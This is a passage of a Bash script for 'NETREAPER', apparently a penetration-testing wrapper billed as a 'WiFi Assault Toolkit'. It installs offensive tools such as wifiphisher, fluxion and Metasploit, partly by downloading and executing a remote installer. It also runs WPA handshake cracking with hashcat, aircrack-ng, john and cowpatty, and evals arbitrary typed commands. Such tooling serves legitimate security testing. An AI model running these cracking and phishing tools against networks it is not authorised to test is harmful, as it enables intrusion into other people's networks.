    echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
    read -r choice
    
    local outfile
    outfile="${OUTPUT_DIR}/capture_$(date +%Y%m%d_%H%M%S).pcap"
    
    case "$choice" in
        1)
            check_tool "tcpdump" || return 1
            require_root || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting tcpdump on $IFACE (Ctrl+C to stop)"
            echo -e "    ${C_SHADOW}Output: $outfile${C_RESET}"
            log_command_preview "tcpdump -i ${IFACE} -w ${outfile}"
            tcpdump -i "$IFACE" -w "$outfile"
            operation_summary "tcpdump" "$start_ms" "$outfile"
            ;;
        2)
            check_tool "wireshark" || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Launching Wireshark on $IFACE"
            log_command_preview "wireshark -i ${IFACE} -k"
            wireshark -i "$IFACE" -k &
            operation_summary "Wireshark" "$start_ms" "$outfile"
            ;;
        3)
            check_tool "tshark" || return 1
            require_root || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting tshark on $IFACE (Ctrl+C to stop)"
            log_command_preview "tshark -i ${IFACE} -w ${outfile}"
            tshark -i "$IFACE" -w "$outfile"
            operation_summary "tshark" "$start_ms" "$outfile"
            ;;
    esac
}

cmd_install_arsenal() {
    require_root || return 1
    
    echo -e "\n    ${C_FIRE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
    echo -e "    ${C_FIRE}â•‘              NETREAPER ARSENAL INSTALLER                  â•‘${C_RESET}"
    echo -e "    ${C_FIRE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}\n"
    
    log_info "This will install 70+ security tools (~2-5GB)"
    log_info "Estimated time: 10-30 minutes depending on connection"
    echo
    echo -ne "    ${C_GHOST}Continue with full installation? [y/N]: ${C_RESET}"
    read -r confirm
    [[ "${confirm,,}" != "y" ]] && { log_info "Installation cancelled"; return 0; }
    
    echo
    log_info "Updating package lists..."
    apt update
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # SCANNING TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing scanning tools..."
    apt install -y nmap masscan unicornscan netdiscover arp-scan fping \
        hping3 p0f arping nbtscan 2>/dev/null || true
    
    # Rustscan (from GitHub releases)
    if ! command -v rustscan &>/dev/null; then
        log_info "Installing rustscan..."
        local rustscan_deb="/tmp/rustscan.deb"
        wget -q "https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb" -O "$rustscan_deb" 2>/dev/null
        dpkg -i "$rustscan_deb" 2>/dev/null || apt install -f -y 2>/dev/null
        rm -f "$rustscan_deb"
    fi
    
    # Zmap
    apt install -y zmap 2>/dev/null || true
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # DNS TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing DNS tools..."
    apt install -y dnsenum dnsmap dnsrecon fierce 2>/dev/null || true
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # SSL TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing SSL tools..."
    apt install -y sslscan sslyze 2>/dev/null || true
    
    # testssl.sh
    if [[ ! -f /usr/local/bin/testssl.sh ]]; then
        log_info "Installing testssl.sh..."
        git clone --depth 1 https://github.com/drwetter/testssl.sh.git /opt/testssl.sh 2>/dev/null
        ln -sf /opt/testssl.sh/testssl.sh /usr/local/bin/testssl.sh 2>/dev/null
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # WIFI TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing WiFi tools..."
    apt install -y aircrack-ng reaver bully pixiewps cowpatty mdk3 mdk4 \
        hostapd dnsmasq macchanger iw wireless-tools 2>/dev/null || true
    
    # Wifite2
    if ! command -v wifite &>/dev/null; then
        log_info "Installing wifite..."
        apt install -y wifite 2>/dev/null || {
            git clone https://github.com/derv82/wifite2.git /opt/wifite2 2>/dev/null
            ln -sf /opt/wifite2/Wifite.py /usr/local/bin/wifite 2>/dev/null
        }
    fi
    
    # Bettercap
    if ! command -v bettercap &>/dev/null; then
        log_info "Installing bettercap..."
        apt install -y bettercap 2>/dev/null || {
            apt install -y libpcap-dev libnetfilter-queue-dev 2>/dev/null
            go install github.com/bettercap/bettercap@latest 2>/dev/null
        }
    fi
    
    # Fluxion
    if [[ ! -d /opt/fluxion ]]; then
        log_info "Installing fluxion..."
        git clone https://github.com/FluxionNetwork/fluxion.git /opt/fluxion 2>/dev/null
        ln -sf /opt/fluxion/fluxion.sh /usr/local/bin/fluxion 2>/dev/null
    fi
    
    # Wifiphisher
    if ! command -v wifiphisher &>/dev/null; then
        log_info "Installing wifiphisher..."
        apt install -y wifiphisher 2>/dev/null || pip3 install wifiphisher 2>/dev/null
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # WEB TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing web tools..."
    apt install -y nikto dirb gobuster sqlmap 2>/dev/null || true
    
    # WPScan
    if ! command -v wpscan &>/dev/null; then
        log_info "Installing wpscan..."
        apt install -y wpscan 2>/dev/null || gem install wpscan 2>/dev/null
    fi
    
    # ffuf
    if ! command -v ffuf &>/dev/null; then
        log_info "Installing ffuf..."
        apt install -y ffuf 2>/dev/null || go install github.com/ffuf/ffuf/v2@latest 2>/dev/null
    fi
    
    # Nuclei
    if ! command -v nuclei &>/dev/null; then
        log_info "Installing nuclei..."
        go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || {
            wget -q "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_$(uname -s)_$(uname -m).zip" -O /tmp/nuclei.zip
            unzip -o /tmp/nuclei.zip -d /usr/local/bin/ 2>/dev/null
            rm -f /tmp/nuclei.zip
        }
    fi
    
    # httpx
    if ! command -v httpx &>/dev/null; then
        log_info "Installing httpx..."
        go install github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null
    fi
    
    # Subfinder
    if ! command -v subfinder &>/dev/null; then
        log_info "Installing subfinder..."
        go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null
    fi
    
    # Amass
    if ! command -v amass &>/dev/null; then
        log_info "Installing amass..."
        apt install -y amass 2>/dev/null || go install github.com/owasp-amass/amass/v4/...@latest 2>/dev/null
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # EXPLOIT TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing exploit tools..."
    
    # Metasploit
    if ! command -v msfconsole &>/dev/null; then
        log_info "Installing metasploit-framework (this takes a while)..."
        apt install -y metasploit-framework 2>/dev/null || {
            curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
            chmod +x /tmp/msfinstall
            /tmp/msfinstall
        }
    fi
    
    # Searchsploit
    if ! command -v searchsploit &>/dev/null; then
        log_info "Installing exploitdb..."
        apt install -y exploitdb 2>/dev/null || {
            git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb 2>/dev/null
            ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit 2>/dev/null
        }
    fi
    
    # CrackMapExec
    if ! command -v crackmapexec &>/dev/null; then
        log_info "Installing crackmapexec..."
        apt install -y crackmapexec 2>/dev/null || pipx install crackmapexec 2>/dev/null
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # TRAFFIC TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing traffic tools..."
    apt install -y tcpdump wireshark tshark ettercap-text-only 2>/dev/null || true
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # OSINT TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing OSINT tools..."
    apt install -y theharvester recon-ng 2>/dev/null || true
    pip3 install shodan 2>/dev/null || true
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # CREDENTIAL TOOLS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing credential tools..."
    apt install -y hashcat john hydra medusa 2>/dev/null || true
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # POST-EXPLOITATION
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing post-exploitation tools..."
    apt install -y impacket-scripts python3-impacket 2>/dev/null || pip3 install impacket 2>/dev/null
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # WORDLISTS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing wordlists..."
    apt install -y wordlists seclists 2>/dev/null || true
    
    # Unpack rockyou if needed
    if [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
        log_info "Extracting rockyou.txt..."
        gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # DEPENDENCIES
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    log_info "Installing dependencies..."
    apt install -y git curl wget python3 python3-pip golang-go ruby \
        build-essential libssl-dev libffi-dev python3-dev 2>/dev/null || true
    
    # Ensure go binaries are in PATH
    if [[ -d "$HOME/go/bin" ]]; then
        export PATH="$PATH:$HOME/go/bin"
        # shellcheck disable=SC2016
        grep -q 'go/bin' ~/.bashrc || echo 'export PATH="$PATH:$HOME/go/bin"' >> ~/.bashrc
    fi
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # FINAL STATUS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    echo
    log_success "Installation complete!"
    echo
    cmd_tool_status
    
    echo
    log_info "Some tools may require additional setup:"
    echo -e "    ${C_SHADOW}â€¢ Metasploit: Run 'msfdb init' to initialize database${C_RESET}"
    echo -e "    ${C_SHADOW}â€¢ Hashcat: May need GPU drivers for full performance${C_RESET}"
    echo -e "    ${C_SHADOW}â€¢ Shodan: Run 'shodan init <API_KEY>' to configure${C_RESET}"
    echo -e "    ${C_SHADOW}â€¢ WPScan: Run 'wpscan --update' to get latest data${C_RESET}"
}

cmd_install_quick() {
    require_root || return 1
    
    log_info "Quick install - essential tools only..."
    apt update
    apt install -y nmap masscan aircrack-ng hashcat john hydra \
        nikto gobuster sqlmap tcpdump wireshark wordlists 2>/dev/null
    
    # Unpack rockyou
    [[ -f /usr/share/wordlists/rockyou.txt.gz ]] && gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    
    log_success "Quick install complete!"
    cmd_tool_status
}

cmd_tool_status() {
    echo
    echo -e "    ${C_SKULL}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
    echo -e "    ${C_SKULL}â•‘${C_RESET}                    ${C_FIRE}ARSENAL STATUS${C_RESET}                        ${C_SKULL}â•‘${C_RESET}"
    echo -e "    ${C_SKULL}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
    echo
    
    local installed=0 missing=0
    
    # Check each category
    for category in "SCANNING:${TOOLS_SCANNING[*]}" "DNS:${TOOLS_DNS[*]}" "SSL:${TOOLS_SSL[*]}" \
                    "WIFI:${TOOLS_WIFI[*]}" "WEB:${TOOLS_WEB[*]}" "EXPLOIT:${TOOLS_EXPLOIT[*]}" \
                    "TRAFFIC:${TOOLS_TRAFFIC[*]}" "OSINT:${TOOLS_OSINT[*]}" \
                    "CREDS:${TOOLS_CREDS[*]}" "POST:${TOOLS_POST[*]}"; do
        local name="${category%%:*}"
        local tools="${category#*:}"
        
        echo -e "    ${C_GHOST}$name:${C_RESET}"
        printf "    "
        
        for tool in $tools; do
            if command -v "$tool" &>/dev/null; then
                printf "${C_VENOM}âœ“${C_RESET}%-12s " "$tool"
                ((installed++))
            else
                printf "${C_BLOOD}âœ—${C_RESET}%-12s " "$tool"
                ((missing++))
            fi
        done
        echo
    done
    
    echo
    echo -e "    ${C_VENOM}Installed: $installed${C_RESET}  ${C_BLOOD}Missing: $missing${C_RESET}"
}

cmd_view_logs() {
    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
        log_warning "No logs found"
        return
    fi
    
    echo
    echo -e "    ${C_SKULL}Recent logs:${C_RESET}"
    echo
    # shellcheck disable=SC2012
    ls -lt "$LOG_DIR"/*.log 2>/dev/null | head -10
    echo
    echo -ne "    ${C_GHOST}View file (or Enter to skip): ${C_RESET}"
    read -r logfile
    
    [[ -n "$logfile" ]] && [[ -f "$logfile" ]] && less "$logfile"
}

cmd_generate_report() {
    local report
    report="${OUTPUT_DIR}/report_$(date +%Y%m%d_%H%M%S).md"
    
    {
        echo "# NETREAPER Engagement Report"
        echo "Generated: $(date)"
        echo "Operator: $(whoami)@$(hostname)"
        echo
        echo "## Session Files"
        echo
        ls -la "$OUTPUT_DIR" 2>/dev/null
        echo
        echo "## Log Summary"
        echo
        wc -l "$LOG_DIR"/*.log 2>/dev/null
        echo
        echo "---"
        echo "NETREAPER v${VERSION}"
    } > "$report"
    
    log_loot "Report saved: $report"
}

cmd_run_direct() {
    echo -ne "    ${C_GHOST}Command: ${C_RESET}"
    read -r cmd
    [[ -z "$cmd" ]] && return
    operation_header "Direct command" "manual"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Executing: $cmd"
    echo
    eval "$cmd"
    operation_summary "Direct command" "$start_ms" "${LOG_DIR}/netreaper.log"
}

show_help() {
    clear
    show_mini_banner
    echo
    echo -e "    ${C_SKULL}NETREAPER${C_RESET} - Network Security & WiFi Assault Toolkit"
    echo
    echo -e "    ${C_GHOST}USAGE:${C_RESET}"
    echo "        $SCRIPT_NAME [--quiet|--json] [command] [options] [target]"
    echo
    echo -e "    ${C_GHOST}COMMANDS:${C_RESET}"
    echo "        scan <target>       Port scanning (--full/--stealth/--vuln/--udp)"
    echo "        wifi <mode> <if>    WiFi monitor/managed/scan"
    echo "        crack <cap>         Handshake cracking (hashcat/aircrack/john/cowpatty)"
    echo "        session <action>    start|resume|status|list|export|notes"
    echo "        history             Show target history"
    echo "        favorite            Manage favorites (add/list/use)"
    echo "        alias               Manage aliases"
    echo "        profile             Manage scan presets"
    echo "        discover [net]      Discover hosts and pick target"
    echo "        export <f> <fmt>    Export to json/csv/html/md"
    echo "        schedule            Manage scheduled scans"
    echo "        diff <f1> <f2>      Compare two scan outputs"
    echo "        status              Show installed tools"
    echo "        install             Install security tools"
    echo "        menu                Interactive menu (default)"
    echo "        help                Show this help"
    echo "        version             Show version"
    echo
    echo -e "    ${C_GHOST}EXAMPLES:${C_RESET}"
    echo "        $SCRIPT_NAME scan 192.168.1.0/24 --full"
    echo "        $SCRIPT_NAME wifi --monitor wlan0"
    echo "        $SCRIPT_NAME crack handshake.cap --hashcat-rules --wordlist custom.txt"
    echo "        $SCRIPT_NAME session start"
    echo "        $SCRIPT_NAME profile save fast --quick"
    echo "        $SCRIPT_NAME discover 192.168.1.0/24"
    echo "        $SCRIPT_NAME schedule add '0 2 * * *' 'scan 192.168.1.1 --full'"
    echo
    echo -e "    ${C_SHADOW}Config: $CONFIG_DIR${C_RESET}"
    echo -e "    ${C_SHADOW}Logs:   $LOG_DIR${C_RESET}"
    echo -e "    ${C_SHADOW}Output: $OUTPUT_DIR${C_RESET}"
    echo
    pause
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CLI INTERFACE
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cli_scan() {
    TARGET="$1"
    shift
    local scan_type="quick" profile_name=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --full)    scan_type="full" ;;
            --stealth) scan_type="stealth" ;;
            --vuln)    scan_type="vuln" ;;
            --udp)     scan_type="udp" ;;
            --profile) shift; profile_name="$1" ;;
            *)         TARGET="$1" ;;
        esac
        shift
    done

    [[ -z "$TARGET" ]] && { show_usage; exit 1; }
    TARGET="$(resolve_target_alias "$TARGET")"
    validate_target "$TARGET" || exit 1
    record_history "$TARGET"

    if [[ -n "$profile_name" ]]; then
        local p_args
        p_args=$(profile_load "$profile_name") || { log_error "Profile not found"; exit 1; }
        for opt in $p_args; do
            case "$opt" in
                --full|full) scan_type="full" ;;
                --stealth|stealth) scan_type="stealth" ;;
                --vuln|vuln) scan_type="vuln" ;;
                --udp|udp) scan_type="udp" ;;
                *) ;; 
            esac
        done
    fi
    OUTPUT_FILE="${OUTPUT_DIR}/${TARGET//[^a-zA-Z0-9._-]/_}_$(date +%Y%m%d_%H%M%S)"
    
    case "$scan_type" in
        quick)   run_nmap_quick ;;
        full)    run_nmap_full ;;
        stealth) run_nmap_stealth ;;
        vuln)    run_nmap_vuln ;;
        udp)     run_nmap_udp ;;
    esac
}

cli_wifi() {
    local action="${1:-}" iface="${2:-}"
    
    case "$action" in
        --monitor)
            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
            require_root || exit 1
            IFACE="$iface"
            operation_header "WiFi monitor (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "ip link set ${IFACE} down && iw dev ${IFACE} set type monitor"
            ip link set "$IFACE" down
            iw dev "$IFACE" set type monitor 2>/dev/null || iwconfig "$IFACE" mode monitor
            ip link set "$IFACE" up
            operation_summary "Monitor mode enabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
        --managed)
            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
            require_root || exit 1
            IFACE="$iface"
            operation_header "WiFi managed (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "ip link set ${IFACE} down && iw dev ${IFACE} set type managed"
            ip link set "$IFACE" down
            iw dev "$IFACE" set type managed 2>/dev/null || iwconfig "$IFACE" mode managed
            ip link set "$IFACE" up
            operation_summary "Managed mode enabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
        --scan)
            require_root || exit 1
            check_tool "airodump-ng" || exit 1
            IFACE="${iface:-wlan0}"
            operation_header "WiFi scan (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "airodump-ng ${IFACE}"
            airodump-ng "$IFACE"
            operation_summary "WiFi scan" "$start_ms" "${LOG_DIR}/wifi_scan.log"
            ;;
        *)
            echo "Usage: $SCRIPT_NAME wifi [--monitor|--managed|--scan] <interface>"
            ;;
    esac
}

cli_crack() {
    local mode="hashcat" capfile="" wordlist="${DEFAULT_WORDLIST}" ssid="" rules=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --aircrack) mode="aircrack" ;;
            --john) mode="john" ;;
            --cowpatty) mode="cowpatty" ;;
            --hashcat-rules) mode="hashcat-rules" ;;
            -w|--wordlist) shift; wordlist="$1" ;;
            --ssid) shift; ssid="$1" ;;
            --rules) shift; rules="$1" ;;
            *) capfile="$1" ;;
        esac
        shift
    done
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; exit 1; }

    case "$mode" in
        aircrack)
            check_tool "aircrack-ng" || exit 1
            operation_header "Aircrack (CLI)" "$capfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_attack "Aircrack-ng dictionary attack (CLI)"
            log_command_preview "aircrack-ng -w ${wordlist} ${capfile}"
            aircrack-ng -w "$wordlist" "$capfile" || exit 1
            operation_summary "Aircrack" "$start_ms" "${LOG_DIR}/aircrack_cli.log"
            ;;
        john)
            check_tool "john" || exit 1
            check_tool "hccap2john" || exit 1
            local john_hash
            john_hash="${LOOT_DIR}/john_cli_$(date +%Y%m%d_%H%M%S).hash"
            hccap2john "$capfile" > "$john_hash"
            operation_header "John (CLI)" "$capfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "john --wordlist=${wordlist} ${john_hash}"
            john --wordlist="$wordlist" "$john_hash" || exit 1
            john --show "$john_hash" || true
            operation_summary "John" "$start_ms" "${LOG_DIR}/john_cli.log"
            ;;
        cowpatty)
            check_tool "cowpatty" || exit 1
            [[ -z "$ssid" ]] && { log_error "SSID required (--ssid)"; exit 1; }
            operation_header "Cowpatty (CLI)" "$ssid"
            local start_ms
            start_ms=$(start_timer_ms)
            log_attack "Cowpatty WPA crack (CLI)"
            log_command_preview "cowpatty -r ${capfile} -s ${ssid} -f ${wordlist} -2"
            cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 || exit 1
            operation_summary "Cowpatty" "$start_ms" "${LOG_DIR}/cowpatty_cli.log"
            ;;
        hashcat-rules)
            rules="${rules:-/usr/share/hashcat/rules/best64.rule}"
            check_tool "hashcat" || exit 1
            local hashfile_hr="$capfile"
            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
                hashfile_hr=$(cmd_convert_hashcat "$capfile" | tail -n 1)
                [[ -z "$hashfile_hr" ]] && { log_error "Conversion failed"; exit 1; }
            fi
            operation_header "Hashcat rules (CLI)" "$hashfile_hr"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "hashcat -m 22000 -a 0 ${hashfile_hr} ${wordlist} -r ${rules} --status --status-timer=15 --potfile-path ${LOG_DIR}/hashcat.pot --session netreaper"
            hashcat -m 22000 -a 0 "$hashfile_hr" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
            operation_summary "Hashcat rules" "$start_ms" "${LOG_DIR}/hashcat.log"
            ;;
        *)
            check_tool "hashcat" || exit 1
            local hashfile="$capfile"
            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
                hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
                [[ -z "$hashfile" ]] && { log_error "Conversion failed"; exit 1; }
            fi
            operation_header "Hashcat (CLI)" "$hashfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "hashcat -m 22000 -a 0 ${hashfile} ${wordlist} --status --status-timer=15 --potfile-path ${LOG_DIR}/hashcat.pot --session netreaper"
            hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
            operation_summary "Hashcat" "$start_ms" "${LOG_DIR}/hashcat.log"
            ;;
    esac
}

cli_session() {
    local action="${1:-status}"
    case "$action" in
        start) session_start ;;
        resume) session_resume ;;
        status) session_status ;;
        list) session_list ;;
        export) session_export ;;
        notes) session_notes ;;
        *) log_error "Unknown session action: $action"; exit 1 ;;
    esac
}

show_usage() {
    echo -e "${C_BLOOD}NETREAPER${C_RESET} v${VERSION} - Network Security & WiFi Assault Toolkit"
    echo
    echo "Usage: $SCRIPT_NAME [--quiet|--json] [command] [options] [target]"
    echo
    echo "Commands:"
    echo "    scan <target>    Port scanning (--quick, --full, --stealth, --vuln, --udp)"
    echo "    wifi             WiFi operations (--monitor, --managed, --scan)"
